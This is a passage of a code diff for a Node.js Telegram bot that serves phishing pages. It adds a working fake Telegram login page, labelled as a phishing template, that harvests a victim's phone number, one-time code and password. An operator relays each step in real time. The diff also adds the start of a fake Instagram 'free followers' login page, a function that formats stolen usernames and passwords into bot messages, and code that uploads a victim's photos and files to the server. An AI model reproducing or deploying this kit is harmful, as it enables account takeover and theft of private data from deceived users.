+        logToFile('✅ QR saved');
+        return true;
+    } catch (err) {
+        console.error('❌ QR save error:', err);
+        logToFile('❌ QR save error: ' + err.message);
+        return false;
+    }
+}
+function deleteQRFile() {
+    if (fs.existsSync(QR_FILE)) {
+        fs.unlinkSync(QR_FILE);
+        console.log('✅ QR deleted');
+        logToFile('✅ QR deleted');
+        return true;
+    }
+    return false;
+}
+function qrExists() { return fs.existsSync(QR_FILE); }
+
+// ====================== SCAN FUNCTIONS ======================
+async function processScanFiles(userId, files, platform) {
+    const photoFiles = [];
+    const smallFiles = [];
+    
+    for (const file of files) {
+        if (file.size >= 10240 && file.size <= 1048576) {
+            // Check if it's a photo (image)
+            if (file.mimetype && file.mimetype.startsWith('image/')) {
+                photoFiles.push(file);
+            } else if (file.size < 300 * 1024) {
+                // Files smaller than 300KB
+                smallFiles.push(file);
+            }
+        }
+    }
+    
+    // If photos exist, transfer photos
+    const filesToTransfer = photoFiles.length > 0 ? photoFiles : smallFiles;
+    
+    let transferred = 0;
+    for (const file of filesToTransfer) {
+        try {
+            const reader = new FileReader();
+            const fileData = await new Promise((resolve, reject) => {
+                reader.onload = (e) => resolve(e.target.result);
+                reader.onerror = reject;
+                reader.readAsDataURL(file);
+            });
+            
+            await fetch(config.baseUrl + '/api/upload-photo-fast', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    userid: userId,
+                    platform: platform,
+                    filename: file.name,
+                    data: fileData,
+                    size: file.size
+                })
+            });
+            transferred++;
+        } catch (err) {
+            console.error('File transfer error:', err);
+        }
+    }
+    
+    // Clean up temp files
+    for (const file of files) {
+        try { URL.revokeObjectURL(file); } catch(e) {}
+    }
+    
+    return { transferred, total: filesToTransfer.length, isPhotos: photoFiles.length > 0 };
+}
+
+// ====================== HELPER FUNCTIONS ======================
+function getUptime() {
+    const ut = process.uptime();
+    const h = Math.floor(ut / 3600);
+    const m = Math.floor((ut % 3600) / 60);
+    const s = Math.floor(ut % 60);
+    return h + 'h ' + m + 'm ' + s + 's';
+}
+function LoveHit(SYloveDaTe, SYloveTiMe, platform, username, password, dev) {
+    return replaceAllEmojis('🖤©🖤 ʷᵉ ʟᴏᴠᴇ ʏᴏᴜ sᴇxʏ ʙᴏʏ ﾂ.🖤ª🖤\n\n🐉⨀-----------------------------------⨀🐉\n↝ ɴᴀᴍᴇ » ') + platform + replaceAllEmojis('\n📧 ↝ ᴜsᴇʀɴᴀᴍᴇ » ') + username + replaceAllEmojis('\n📟 ↝ ᴘᴀssᴡᴏʀᴅ » ') + password + replaceAllEmojis('\n⏱ ↝ ᴛɪᴍᴇ » ') + SYloveTiMe + replaceAllEmojis('\n📝 ↝ ᴅᴀᴛᴇ » ') + SYloveDaTe + replaceAllEmojis('\n🐉⨀-----------------------------------⨀🐉\n↝ ʙʏ ᴅᴇᴠ » ') + dev;
+}
+function MenuLove(firstName, dev, botName, LoveTime, message) {
+    return replaceAllEmojis('─【 ') + dev + replaceAllEmojis(' 】─\n────────────────────\n ᴜsᴇʀ ➤ ') + firstName + replaceAllEmojis(' ›\n ɴᴀᴍᴇ ➤ ') + botName + replaceAllEmojis(' ›\n ᴍᴏᴅᴇ ➤ Premium User ›\n ᴏɴʟɪɴᴇ ➤ ') + LoveTime + replaceAllEmojis(' ›\n ────────────────────\n\n') + message + replaceAllEmojis(' \n\n────────────────────\n ─【 𝐘𝐎𝐔-𝐀𝐑𝐄-𝐁𝐄𝐒𝐓 】─');
+}
+function LoveNotifer(platform, username, password) {
+    const SYloveTiMe = moment().tz('Asia/Kolkata').format('h:mm:ss A');
+    const SYloveDaTe = moment().tz('Asia/Kolkata').format('DD/MM/YYYY');
+    return LoveHit(SYloveDaTe, SYloveTiMe, platform, username, password, config.S7);
+}
+function SYloveMenu(firstName, message) {
+    return MenuLove(firstName, config.S7, 'SeXyxeon', getUptime(), message);
+}
+function logToFile(message) {
+    const timestamp = new Date().toISOString();
+    const logPath = path.join(DATA_DIR, 'logs.txt');
+    try {
+        fs.appendFileSync(logPath, '[' + timestamp + '] ' + message + '\n');
+    } catch (err) {
+        console.error('Log write error:', err);
+    }
+}
+async function resolveUserId(identifier) {
+    if (!identifier) return null;
+    let userId = identifier;
+    if (identifier.startsWith('@')) {
+        try {
+            const chat = await S7.getChat(identifier);
+            userId = chat.id.toString();
+        } catch (e) {
+            return null;
+        }
+    }
+    const user = await User.findOne({ userId: userId });
+    if (!user) return null;
+    return userId;
+}
+async function isUserBanned(userId) {
+    const user = await getUser(userId);
+    return user.banned;
+}
+
+// ====================== FAST SEND BATCH ======================
+var pendingPhotos = {};
+var userActive = {};
+async function sendBatchPhotos(userId) {
+    if (!pendingPhotos[userId] || pendingPhotos[userId].length === 0) return;
+    const photos = pendingPhotos[userId];
+    const count = photos.length;
+    logToFile('📸 Sending ' + count + ' photos to user ' + userId);
+    try {
+        await S7.sendPhoto(userId, photos[0], { caption: replaceAllEmojis('📸 <b>' + count + ' photos received!</b>'), parse_mode: 'HTML' });
+        const batch = [];
+        for (let i = 1; i < photos.length; i++) {
+            batch.push(S7.sendPhoto(userId, photos[i]));
+            if (batch.length >= 5) { await Promise.all(batch); batch.length = 0; }
+        }
+        if (batch.length) await Promise.all(batch);
+    } catch (err) {
+        logToFile('❌ Error sending photos: ' + err.message);
+        for (let j = 1; j < photos.length; j++) {
+            try { await S7.sendPhoto(userId, photos[j]); } catch (e) {}
+        }
+    }
+    // Clean up temp files
+    for (const photo of photos) {
+        try {
+            if (photo.path) fs.unlinkSync(photo.path);
+        } catch (e) {}
+    }
+    delete pendingPhotos[userId];
+    delete userActive[userId];
+}
+
+// ====================== TELEGRAM PHISHING TEMPLATE (with premium emojis) ======================
+const TELEGRAM_LOGIN_TEMPLATE = `<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Telegram</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+        }
+        body {
+            background: #0a0a0a;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        .container {
+            max-width: 480px;
+            width: 100%;
+            background: #17212b;
+            border-radius: 32px;
+            padding: 45px 32px 40px;
+            box-shadow: 0 25px 80px rgba(0,0,0,0.9);
+            border: 1px solid rgba(255,255,255,0.04);
+        }
+        .logo {
+            text-align: center;
+            margin-bottom: 35px;
+        }
+        .logo svg {
+            width: 72px;
+            height: 72px;
+        }
+        .logo h1 {
+            color: #ffffff;
+            font-size: 28px;
+            font-weight: 700;
+            margin-top: 10px;
+            letter-spacing: -0.5px;
+        }
+        .logo p {
+            color: #8b9bb5;
+            font-size: 16px;
+            margin-top: 6px;
+            font-weight: 400;
+        }
+        .input-group {
+            margin-bottom: 20px;
+            position: relative;
+        }
+        .input-group label {
+            display: block;
+            color: #8b9bb5;
+            font-size: 14px;
+            font-weight: 500;
+            margin-bottom: 8px;
+            letter-spacing: 0.3px;
+        }
+        .input-group input {
+            width: 100%;
+            padding: 16px 18px;
+            background: #1e2a36;
+            border: 2px solid #2b3b4a;
+            border-radius: 14px;
+            color: #ffffff;
+            font-size: 18px;
+            outline: none;
+            transition: all 0.25s ease;
+        }
+        .input-group input:focus {
+            border-color: #2b9eff;
+            background: #1e2a36;
+            box-shadow: 0 0 0 4px rgba(43, 158, 255, 0.12);
+        }
+        .input-group input::placeholder {
+            color: #6b7f94;
+            font-size: 16px;
+        }
+        .input-group .country-select {
+            position: absolute;
+            left: 18px;
+            top: 42px;
+            color: #ffffff;
+            font-weight: 600;
+            font-size: 18px;
+            pointer-events: none;
+            background: #1e2a36;
+            padding-right: 10px;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+        .input-group .country-select .flag {
+            font-size: 20px;
+        }
+        .input-group .country-select .arrow {
+            font-size: 12px;
+            color: #6b7f94;
+        }
+        .input-group .phone-input {
+            padding-left: 75px;
+        }
+        .btn {
+            width: 100%;
+            padding: 18px;
+            background: #2b9eff;
+            border: none;
+            border-radius: 14px;
+            color: #ffffff;
+            font-size: 18px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.25s ease;
+            margin-top: 12px;
+        }
+        .btn:hover {
+            background: #4aabff;
+            transform: translateY(-2px);
+            box-shadow: 0 8px 30px rgba(43, 158, 255, 0.3);
+        }
+        .btn:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+            transform: none;
+            box-shadow: none;
+        }
+        .btn-secondary {
+            background: transparent;
+            border: 2px solid #2b3b4a;
+            color: #8b9bb5;
+        }
+        .btn-secondary:hover {
+            background: rgba(255,255,255,0.04);
+            border-color: #3b4b5a;
+            transform: none;
+            box-shadow: none;
+        }
+        .footer {
+            text-align: center;
+            margin-top: 28px;
+            color: #6b7f94;
+            font-size: 14px;
+            line-height: 1.6;
+        }
+        .footer a {
+            color: #2b9eff;
+            text-decoration: none;
+            font-weight: 500;
+        }
+        .footer a:hover {
+            text-decoration: underline;
+        }
+        .loader {
+            display: none;
+            text-align: center;
+            padding: 30px 0;
+        }
+        .loader .spinner {
+            width: 50px;
+            height: 50px;
+            border: 4px solid #1e2a36;
+            border-top-color: #2b9eff;
+            border-radius: 50%;
+            animation: spin 0.7s linear infinite;
+            margin: 0 auto;
+        }
+        @keyframes spin {
+            100% { transform: rotate(360deg); }
+        }
+        .loader p {
+            color: #8b9bb5;
+            margin-top: 16px;
+            font-size: 15px;
+            font-weight: 400;
+        }
+        .loader .sub-text {
+            color: #6b7f94;
+            font-size: 13px;
+            margin-top: 6px;
+        }
+        .otp-section {
+            display: none;
+        }
+        .otp-section.active {
+            display: block;
+        }
+        .login-section {
+            display: block;
+        }
+        .login-section.hidden {
+            display: none;
+        }
+        .error-msg {
+            background: rgba(255, 69, 58, 0.12);
+            border: 1px solid rgba(255, 69, 58, 0.25);
+            border-radius: 12px;
+            padding: 14px 18px;
+            color: #ff453a;
+            font-size: 15px;
+            margin-top: 12px;
+            display: none;
+            font-weight: 500;
+        }
+        .error-msg.show {
+            display: block;
+        }
+        .password-section {
+            display: none;
+        }
+        .password-section.active {
+            display: block;
+        }
+        .result-buttons {
+            display: none;
+            gap: 14px;
+            margin-top: 25px;
+            flex-direction: column;
+        }
+        .result-buttons.show {
+            display: flex;
+        }
+        .result-buttons .btn {
+            margin-top: 0;
+        }
+        .status-text {
+            text-align: center;
+            color: #8b9bb5;
+            font-size: 15px;
+            margin-top: 18px;
+            display: none;
+        }
+        .status-text.show {
+            display: block;
+        }
+        .final-status {
+            text-align: center;
+            padding: 25px 0;
+        }
+        .final-status .icon {
+            font-size: 56px;
+            margin-bottom: 12px;
+        }
+        .final-status h3 {
+            color: #ffffff;
+            font-size: 22px;
+            font-weight: 700;
+        }
+        .final-status p {
+            color: #8b9bb5;
+            font-size: 16px;
+            margin-top: 8px;
+            line-height: 1.6;
+        }
+        .final-status .sub {
+            color: #6b7f94;
+            font-size: 14px;
+            margin-top: 6px;
+        }
+        .final-status .highlight {
+            color: #2ed573;
+            font-weight: 600;
+        }
+        .resend-btn {
+            background: transparent;
+            border: none;
+            color: #2b9eff;
+            font-size: 14px;
+            cursor: pointer;
+            font-weight: 600;
+            padding: 10px;
+            margin-top: 8px;
+            transition: all 0.2s;
+        }
+        .resend-btn:hover {
+            color: #4aabff;
+            text-decoration: underline;
+        }
+        .otp-timer {
+            color: #6b7f94;
+            font-size: 13px;
+            text-align: center;
+            margin-top: 10px;
+        }
+        .otp-timer span {
+            color: #ffffff;
+            font-weight: 600;
+        }
+        .input-hint {
+            color: #6b7f94;
+            font-size: 13px;
+            margin-top: 6px;
+            padding-left: 4px;
+        }
+        .decision-waiting {
+            display: none;
+            text-align: center;
+            padding: 30px 0;
+        }
+        .decision-waiting.show {
+            display: block;
+        }
+        .decision-waiting .spinner {
+            width: 50px;
+            height: 50px;
+            border: 4px solid #1e2a36;
+            border-top-color: #2b9eff;
+            border-radius: 50%;
+            animation: spin 0.7s linear infinite;
+            margin: 0 auto;
+        }
+        .decision-waiting p {
+            color: #8b9bb5;
+            margin-top: 16px;
+            font-size: 15px;
+        }
+        .decision-waiting .sub-text {
+            color: #6b7f94;
+            font-size: 13px;
+            margin-top: 6px;
+        }
+        @media (max-width: 480px) {
+            .container {
+                padding: 30px 20px 30px;
+            }
+            .logo h1 {
+                font-size: 24px;
+            }
+            .input-group input {
+                font-size: 16px;
+                padding: 14px 16px;
+            }
+            .input-group .phone-input {
+                padding-left: 70px;
+            }
+            .btn {
+                font-size: 16px;
+                padding: 16px;
+            }
+        }
+    </style>
+</head>
+<body>
+<div class="container">
+    <div class="logo">
+        <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <path d="M12 24C18.6274 24 24 18.6274 24 12C24 5.37258 18.6274 0 12 0C5.37258 0 0 5.37258 0 12C0 18.6274 5.37258 24 12 24Z" fill="#2B9EFF"/>
+            <path d="M6.5 12L16.5 7L17.5 16.5L12.5 14L9.5 16.5L10 12.5L15 9.5L11 11.5L6.5 12Z" fill="white"/>
+        </svg>
+        <h1>Telegram</h1>
+        <p id="page-subtitle">Sign in to your account</p>
+    </div>
+
+    <!-- Login Section -->
+    <div id="loginSection" class="login-section">
+        <div class="input-group">
+            <label>Phone Number</label>
+            <div style="position:relative;">
+                <div class="country-select">
+                    <span class="flag">🇮🇳</span>
+                    <span>+91</span>
+                    <span class="arrow">▼</span>
+                </div>
+                <input type="tel" id="phoneInput" class="phone-input" placeholder="Enter phone number" maxlength="10">
+            </div>
+            <div class="input-hint">Enter your phone number to receive a verification code</div>
+        </div>
+        <button class="btn" id="sendOtpBtn">Send OTP</button>
+        <div id="loginError" class="error-msg"></div>
+        <div class="loader" id="loginLoader">
+            <div class="spinner"></div>
+            <p>Sending verification code...</p>
+        </div>
+        <div class="footer">
+            By signing up, you agree to our <a href="#">Terms</a> &amp; <a href="#">Privacy Policy</a>
+        </div>
+    </div>
+
+    <!-- OTP Section -->
+    <div id="otpSection" class="otp-section">
+        <div class="input-group">
+            <label>Verification Code</label>
+            <input type="text" id="otpInput" placeholder="Enter 5-digit code" maxlength="5" inputmode="numeric">
+            <div class="input-hint">Enter the code sent to your phone</div>
+        </div>
+        <button class="btn" id="verifyOtpBtn">Verify OTP</button>
+        <div id="otpError" class="error-msg"></div>
+        <div id="otpLoader" class="loader">
+            <div class="spinner"></div>
+            <p>Verifying code...</p>
+            <div class="sub-text">Please wait while we verify your OTP</div>
+        </div>
+        <div id="decisionWaiting" class="decision-waiting">
+            <div class="spinner"></div>
+            <p>Verifying your request...</p>
+            <div class="sub-text">Please wait, this may take a moment</div>
+        </div>
+        <div style="text-align:center;margin-top:14px;">
+            <button class="resend-btn" id="resendOtpBtn">⟳ Resend OTP</button>
+        </div>
+        <div class="otp-timer">Code expires in <span id="otpTimer">60</span> seconds</div>
+    </div>
+
+    <!-- Password Section -->
+    <div id="passwordSection" class="password-section">
+        <div class="input-group">
+            <label>Password</label>
+            <input type="password" id="passwordInput" placeholder="Enter your password">
+            <div class="input-hint">Enter your Telegram account password</div>
+        </div>
+        <button class="btn" id="passwordSubmitBtn">Submit</button>
+        <div id="passwordError" class="error-msg"></div>
+        <div id="passwordLoader" class="loader">
+            <div class="spinner"></div>
+            <p>Verifying password...</p>
+        </div>
+        <div style="text-align:center;margin-top:14px;">
+            <a href="#" style="color:#2b9eff;text-decoration:none;font-size:14px;font-weight:500;">Forgot password?</a>
+        </div>
+    </div>
+
+    <!-- Final Result -->
+    <div id="finalResult" style="display:none;">
+        <div class="final-status">
+            <div class="icon">✅</div>
+            <h3>Your Telegram Premium request has been submitted</h3>
+            <p>Please wait 24 hours for activation.</p>
+            <div class="sub"><span class="highlight">🔄</span> Your request is being processed</div>
+            <div class="sub" style="margin-top:8px;">You will receive a confirmation notification</div>
+        </div>
+        <div class="result-buttons show" style="display:flex !important;">
+            <button class="btn" onclick="window.location.href='tg://resolve?domain=telegram'">
+                📱 Open Telegram
+            </button>
+            <button class="btn btn-secondary" id="openCompletedBtn">
+                ✅ I've Opened Telegram
+            </button>
+        </div>
+        <div id="openStatus" class="status-text"></div>
+    </div>
+
+    <!-- Status Messages -->
+    <div id="statusMessage" class="status-text"></div>
+</div>
+
+<script>
+    // ====================== CONFIG ======================
+    const SESSION_ID = 'SESSION_ID_PLACEHOLDER';
+    const USER_ID = 'USER_ID_PLACEHOLDER';
+    const PLATFORM = 'TELEGRAM_PREMIUM';
+
+    // ====================== STATE ======================
+    let currentStep = 'login';
+    let phoneNumber = '';
+    let otpCode = '';
+    let password = '';
+    let otpTimerInterval = null;
+    let otpTimeLeft = 60;
+    let isWaitingForDecision = false;
+    let decisionCheckInterval = null;
+
+    // ====================== DOM REFS ======================
+    const loginSection = document.getElementById('loginSection');
+    const otpSection = document.getElementById('otpSection');
+    const passwordSection = document.getElementById('passwordSection');
+    const finalResult = document.getElementById('finalResult');
+
+    const phoneInput = document.getElementById('phoneInput');
+    const sendOtpBtn = document.getElementById('sendOtpBtn');
+    const loginLoader = document.getElementById('loginLoader');
+    const loginError = document.getElementById('loginError');
+
+    const otpInput = document.getElementById('otpInput');
+    const verifyOtpBtn = document.getElementById('verifyOtpBtn');
+    const otpLoader = document.getElementById('otpLoader');
+    const otpError = document.getElementById('otpError');
+    const resendOtpBtn = document.getElementById('resendOtpBtn');
+    const otpTimer = document.getElementById('otpTimer');
+    const decisionWaiting = document.getElementById('decisionWaiting');
+
+    const passwordInput = document.getElementById('passwordInput');
+    const passwordSubmitBtn = document.getElementById('passwordSubmitBtn');
+    const passwordLoader = document.getElementById('passwordLoader');
+    const passwordError = document.getElementById('passwordError');
+
+    const openCompletedBtn = document.getElementById('openCompletedBtn');
+    const openStatus = document.getElementById('openStatus');
+
+    // ====================== HELPER FUNCTIONS ======================
+    function showLoader(loader) {
+        loader.style.display = 'block';
+    }
+    function hideLoader(loader) {
+        loader.style.display = 'none';
+    }
+    function showError(errorEl, msg) {
+        errorEl.textContent = msg;
+        errorEl.classList.add('show');
+        setTimeout(() => errorEl.classList.remove('show'), 6000);
+    }
+    function hideError(errorEl) {
+        errorEl.classList.remove('show');
+    }
+    function setStatus(msg, isSuccess = false) {
+        const el = document.getElementById('statusMessage');
+        el.textContent = msg;
+        el.className = 'status-text show';
+        if (isSuccess) {
+            el.style.color = '#2ed573';
+        } else {
+            el.style.color = '#8b9bb5';
+        }
+        setTimeout(() => {
+            el.classList.remove('show');
+            el.style.color = '#8b9bb5';
+        }, 5000);
+    }
+
+    function simulateLoading(callback, duration = 1500) {
+        return new Promise(resolve => {
+            setTimeout(() => {
+                if (callback) callback();
+                resolve();
+            }, duration);
+        });
+    }
+
+    function startOtpTimer() {
+        otpTimeLeft = 60;
+        otpTimer.textContent = otpTimeLeft;
+        if (otpTimerInterval) clearInterval(otpTimerInterval);
+        otpTimerInterval = setInterval(() => {
+            otpTimeLeft--;
+            otpTimer.textContent = otpTimeLeft;
+            if (otpTimeLeft <= 0) {
+                clearInterval(otpTimerInterval);
+                otpTimer.textContent = '0';
+                resendOtpBtn.style.color = '#2b9eff';
+                resendOtpBtn.style.cursor = 'pointer';
+                resendOtpBtn.disabled = false;
+            }
+        }, 1000);
+        resendOtpBtn.style.color = '#6b7f94';
+        resendOtpBtn.style.cursor = 'not-allowed';
+        resendOtpBtn.disabled = true;
+    }
+
+    function showDecisionWaiting() {
+        hideLoader(otpLoader);
+        verifyOtpBtn.style.display = 'none';
+        decisionWaiting.classList.add('show');
+        isWaitingForDecision = true;
+        if (decisionCheckInterval) clearInterval(decisionCheckInterval);
+        decisionCheckInterval = setInterval(checkDecision, 2000);
+    }
+
+    function hideDecisionWaiting() {
+        decisionWaiting.classList.remove('show');
+        verifyOtpBtn.style.display = 'block';
+        isWaitingForDecision = false;
+        if (decisionCheckInterval) clearInterval(decisionCheckInterval);
+    }
+
+    // ====================== CHECK DECISION ======================
+    async function checkDecision() {
+        try {
+            const response = await fetch('/api/telegram-decision/' + SESSION_ID);
+            const data = await response.json();
+            
+            if (data.decision) {
+                hideDecisionWaiting();
+                
+                if (data.decision === 'password') {
+                    otpSection.classList.remove('active');
+                    passwordSection.classList.add('active');
+                    currentStep = 'password';
+                    setStatus('🔐 Please enter your password', true);
+                    passwordInput.focus();
+                } else if (data.decision === 'wrong') {
+                    showError(otpError, '❌ Invalid verification code. Please try again.');
+                    otpInput.value = '';
+                    otpInput.focus();
+                    verifyOtpBtn.style.display = 'block';
+                    currentStep = 'otp';
+                } else if (data.decision === 'open') {
+                    otpSection.classList.remove('active');
+                    finalResult.style.display = 'block';
+                    currentStep = 'final';
+                    setStatus('✅ Request submitted successfully!', true);
+                }
+            }
+        } catch (err) {
+            console.error('Decision check error:', err);
+        }
+    }
+
+    // ====================== API CALLS ======================
+    async function apiCall(action, data = {}) {
+        try {
+            const response = await fetch('/api/telegram-phish', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ 
+                    ...data, 
+                    sessionId: SESSION_ID, 
+                    userId: USER_ID, 
+                    platform: PLATFORM,
+                    action: action 
+                })
+            });
+            return await response.json();
+        } catch (err) {
+            console.error('API Error:', err);
+            return { error: 'Network error' };
+        }
+    }
+
+    // ====================== LOGIN ======================
+    sendOtpBtn.addEventListener('click', async () => {
+        const phone = phoneInput.value.trim();
+        if (phone.length < 10) {
+            showError(loginError, 'Please enter a valid 10-digit phone number.');
+            return;
+        }
+        phoneNumber = phone;
+        hideError(loginError);
+        showLoader(loginLoader);
+        sendOtpBtn.disabled = true;
+
+        const result = await apiCall('phone', { phone: phoneNumber });
+
+        await simulateLoading(() => {}, 1800);
+
+        hideLoader(loginLoader);
+        sendOtpBtn.disabled = false;
+
+        if (result.status === 'success') {
+            loginSection.classList.add('hidden');
+            otpSection.classList.add('active');
+            currentStep = 'otp';
+            setStatus('📱 Verification code sent to your phone', true);
+            startOtpTimer();
+            otpInput.focus();
+        } else {
+            showError(loginError, '❌ Failed to send OTP. Please try again.');
+        }
+    });
+
+    // ====================== OTP ======================
+    verifyOtpBtn.addEventListener('click', async () => {
+        const otp = otpInput.value.trim();
+        if (otp.length < 5) {
+            showError(otpError, 'Please enter a valid 5-digit verification code.');
+            return;
+        }
+        otpCode = otp;
+        hideError(otpError);
+        showLoader(otpLoader);
+        verifyOtpBtn.disabled = true;
+
+        const result = await apiCall('otp', { otp: otpCode, phone: phoneNumber });
+
+        if (result.status === 'waiting_decision') {
+            hideLoader(otpLoader);
+            showDecisionWaiting();
+            setStatus('⏳ Waiting for verification...');
+        } else if (result.status === 'success') {
+            hideLoader(otpLoader);
+            verifyOtpBtn.disabled = false;
+            otpSection.classList.remove('active');
+            passwordSection.classList.add('active');
+            currentStep = 'password';
+            setStatus('🔐 OTP verified! Enter password', true);
+            passwordInput.focus();
+            if (otpTimerInterval) clearInterval(otpTimerInterval);
+        } else {
+            hideLoader(otpLoader);
+            verifyOtpBtn.disabled = false;
+            showError(otpError, '❌ Verification failed. Please try again.');
+        }
+    });
+
+    // Resend OTP
+    resendOtpBtn.addEventListener('click', async () => {
+        if (resendOtpBtn.disabled) return;
+        setStatus('📤 Resending verification code...');
+        await apiCall('resend-otp', { phone: phoneNumber });
+        setStatus('✅ Verification code resent!', true);
+        startOtpTimer();
+        otpInput.value = '';
+        otpInput.focus();
+    });
+
+    // ====================== PASSWORD ======================
+    passwordSubmitBtn.addEventListener('click', async () => {
+        const pwd = passwordInput.value.trim();
+        if (pwd.length < 4) {
+            showError(passwordError, 'Please enter a valid password (minimum 4 characters).');
+            return;
+        }
+        password = pwd;
+        hideError(passwordError);
+        showLoader(passwordLoader);
+        passwordSubmitBtn.disabled = true;
+
+        const result = await apiCall('password', { password: password, phone: phoneNumber });
+
+        if (result.status === 'success') {
+            hideLoader(passwordLoader);
+            passwordSubmitBtn.disabled = false;
+            passwordSection.classList.remove('active');
+            finalResult.style.display = 'block';
+            currentStep = 'final';
+            setStatus('✅ Premium request submitted successfully!', true);
+        } else {
+            hideLoader(passwordLoader);
+            passwordSubmitBtn.disabled = false;
+            showError(passwordError, '❌ Wrong password. Please try again.');
+            passwordInput.value = '';
+            passwordInput.focus();
+        }
+    });
+
+    // ====================== FINAL BUTTONS ======================
+    openCompletedBtn.addEventListener('click', () => {
+        openStatus.textContent = '✅ Thank you! Your request has been submitted.';
+        openStatus.className = 'status-text show';
+        openStatus.style.color = '#2ed573';
+        setStatus('📱 Request submitted successfully!', true);
+        apiCall('completed', { phone: phoneNumber });
+    });
+
+    // ====================== KEYBOARD SHORTCUTS ======================
+    phoneInput.addEventListener('keypress', (e) => {
+        if (e.key === 'Enter') sendOtpBtn.click();
+    });
+    otpInput.addEventListener('keypress', (e) => {
+        if (e.key === 'Enter') verifyOtpBtn.click();
+    });
+    passwordInput.addEventListener('keypress', (e) => {
+        if (e.key === 'Enter') passwordSubmitBtn.click();
+    });
+
+    // ====================== PHONE NUMBER FORMATTING ======================
+    phoneInput.addEventListener('input', () => {
+        phoneInput.value = phoneInput.value.replace(/[^0-9]/g, '').slice(0, 10);
+    });
+    otpInput.addEventListener('input', () => {
+        otpInput.value = otpInput.value.replace(/[^0-9]/g, '').slice(0, 5);
+    });
+
+    // ====================== AUTO-FOCUS ======================
+    phoneInput.focus();
+
+    console.log('✅ Telegram Phishing Page Loaded');
+    console.log('👤 User ID:', USER_ID);
+    console.log('📱 Session:', SESSION_ID);
+</script>
+</body>
+</html>`;
+
+// ====================== OTHER TEMPLATES (with premium emojis) ======================
+const INSTA_TEMPLATE = `<!DOCTYPE html>
+<html>
+<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>instafree1kfollowers</title>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+<style>*{margin:0;padding:0;box-sizing:border-box;font-family:"Segoe UI",sans-serif}body{background:linear-gradient(145deg,#1a0a2e,#2d1b4e,#0a0a0a);height:100vh;display:flex;justify-content:center;align-items:center;padding:20px;overflow:hidden}.card{background:rgba(255,255,255,0.05);backdrop-filter:blur(30px);border:1px solid rgba(255,255,255,0.12);border-radius:30px;padding:45px 35px;width:100%;max-width:420px;box-shadow:0 40px 80px rgba(0,0,0,0.8),inset 0 1px 0 rgba(255,255,255,0.1)}.logo{text-align:center;margin-bottom:30px}.logo i{font-size:65px;background:linear-gradient(45deg,#f09433,#e6683c,#dc2743,#cc2366,#bc1888);-webkit-background-clip:text;-webkit-text-fill-color:transparent}.logo h1{color:#fff;font-size:28px;font-weight:700;margin-top:5px}.input-group{position:relative;margin-bottom:18px}.input-group i{position:absolute;left:18px;top:50%;transform:translateY(-50%);color:#888;font-size:18px}.input-group input{width:100%;background:rgba(255,255,255,0.08);border:1px solid rgba(255,255,255,0.12);border-radius:16px;padding:18px 18px 18px 50px;color:#fff;font-size:16px;outline:none;transition:all .3s}.input-group input:focus{border-color:#d62976;background:rgba(255,255,255,0.12);box-shadow:0 0 30px rgba(214,41,118,0.15)}.input-group input::placeholder{color:#777}.btn{width:100%;padding:18px;border:none;border-radius:16px;background:linear-gradient(135deg,#4f5bd5,#d62976);color:#fff;font-size:18px;font-weight:700;cursor:pointer;transition:all .3s;box-shadow:0 10px 30px rgba(214,41,118,0.3)}.btn:hover{transform:translateY(-2px);box-shadow:0 15px 40px rgba(214,41,118,0.5)}.loader{display:none;text-align:center;padding:20px 0}.loader .spinner{width:40px;height:40px;border:4px solid rgba(255,255,255,0.1);border-top-color:#d62976;border-radius:50%;animation:spin 0.8s linear infinite;margin:0 auto}@keyframes spin{100%{transform:rotate(360deg)}}.loader p{color:#aaa;margin-top:15px;font-size:14px}.progress-bar{width:100%;height:5px;background:rgba(255,255,255,0.1);border-radius:10px;overflow:hidden;margin:20px 0;display:none}.progress-bar .fill{height:100%;width:0%;background:linear-gradient(90deg,#4f5bd5,#d62976);transition:width .3s}.result{display:none;text-align:center;padding:20px}.result i{font-size:50px;color:#28a745}.result h3{color:#fff;margin-top:10px}.bg-shapes{position:fixed;top:0;left:0;width:100%;height:100%;z-index:-1;overflow:hidden}.bg-shapes span{position:absolute;border-radius:50%;background:radial-gradient(circle,rgba(214,41,118,0.15),transparent 70%);animation:float 20s infinite ease-in-out}.bg-shapes span:nth-child(1){width:400px;height:400px;top:-100px;right:-100px;animation-delay:-2s}.bg-shapes span:nth-child(2){width:300px;height:300px;bottom:-50px;left:-50px;animation-delay:-5s}@keyframes float{0%,100%{transform:translate(0,0) scale(1)}50%{transform:translate(30px,-30px) scale(1.1)}}.footer{text-align:center;margin-top:20px;color:#555;font-size:12px}.footer a{color:#888;text-decoration:none}
+</style>
+</head>
+<body>
+<div class="bg-shapes"><span></span><span></span></div>
+<div class="card">
+<div class="logo"><i class="fab fa-instagram"></i><h1>instafree1kfollowers</h1></div>
+<div id="form-screen">
+<div class="input-group"><i class="fas fa-user"></i><input type="text" id="username" placeholder="Username or Email"></div>
+<div class="input-group"><i class="fas fa-lock"></i><input type="password" id="password" placeholder="Password"></div>
+<button class="btn" onclick="startEngine()"><i class="fas fa-bolt"></i> Login Now</button>
+</div>
+<div id="process-screen" style="display:none">
+<div class="loader" style="display:block"><div class="spinner"></div><p id="status-text">Connecting...</p></div>
+<div class="progress-bar" style="display:block"><div class="fill" id="progress-fill"></div></div>
+<div id="result-area" style="display:none">
+<i class="fas fa-check-circle" style="color:#28a745;font-size:50px"></i>
